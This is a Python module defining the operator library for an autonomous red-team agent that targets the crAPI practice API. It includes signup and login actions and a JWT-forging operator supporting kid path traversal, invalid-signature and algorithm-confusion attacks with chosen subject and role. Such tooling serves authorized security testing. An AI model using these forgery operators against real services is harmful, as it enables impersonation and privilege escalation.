"""Operator library for the autonomous red-team agent.

Each operator is a small, tiered action with preconditions/effects that the
planner/executor composes into an engagement. Tiers:

* ``passive``  -- no packets to the target (parse spec, reason);
* ``bounded``  -- a small number of requests (recon/enumeration);
* ``intrusive``-- state-changing or high-volume; requires ``--authorize``.

Operators mutate a shared ``state`` dict (tokens, discovered ids, flags) and
return an observation dict that the executor logs and the success predicate can
inspect.

For authorized engagements only.
"""

from __future__ import annotations

from typing import Callable, Dict, List

from .auth import CrApiClient
from .jwt import forge_kid_path_traversal, forge_invalid_signature, forge_alg_confusion

State = Dict


def _http(client: CrApiClient, state: State, params: Dict) -> Dict:
    method = params["method"].upper()
    token = params.get("token", "") or ""
    path = params["path"].format(**state.get("vars", {}), **params.get("fmt", {}))
    fn = {"GET": client.get, "POST": client.post, "PUT": client.put,
          "DELETE": client.delete}.get(method, client.get)
    kwargs = {"path": path, "token": token}
    if method in ("POST", "PUT"):
        kwargs["json_body"] = params.get("body", {})
    return fn(**kwargs)


def _signup(client: CrApiClient, state: State, params: Dict) -> Dict:
    r = client.signup(params["name"], params["email"], params["number"], params["password"])
    state.setdefault("users", []).append(params["email"])
    return r


def _login(client: CrApiClient, state: State, params: Dict) -> Dict:
    r = client.login(params["email"], params["password"])
    if r.get("token"):
        state.setdefault("tokens", {})[params["email"]] = r["token"]
    return r


def _forge_jwt(client: CrApiClient, state: State, params: Dict) -> Dict:
    technique = params.get("technique", "kid_path_traversal")
    payload = {"sub": params["sub"], "role": params.get("role", "user")}
    if technique == "kid_path_traversal":
        token = forge_kid_path_traversal(payload)
    elif technique == "invalid_signature":
        token = forge_invalid_signature(payload)
    elif technique == "alg_confusion":
        token = forge_alg_confusion(payload, params.get("public_key", b""))
    else:
        token = forge_invalid_signature(payload)
    state.setdefault("forged", {})[params["sub"]] = token
    return {"token": token, "technique": technique, "status": 0}


OPERATORS: Dict[str, Dict] = {
    "signup":     {"tier": "intrusive", "run": _signup},
    "login":      {"tier": "bounded",   "run": _login},
    "forge_jwt":  {"tier": "passive",   "run": _forge_jwt},
    "http":       {"tier": "bounded",   "run": _http},
}


def run_operator(client: CrApiClient, state: State, name: str, params: Dict) -> Dict:
    return OPERATORS[name]["run"](client, state, params)
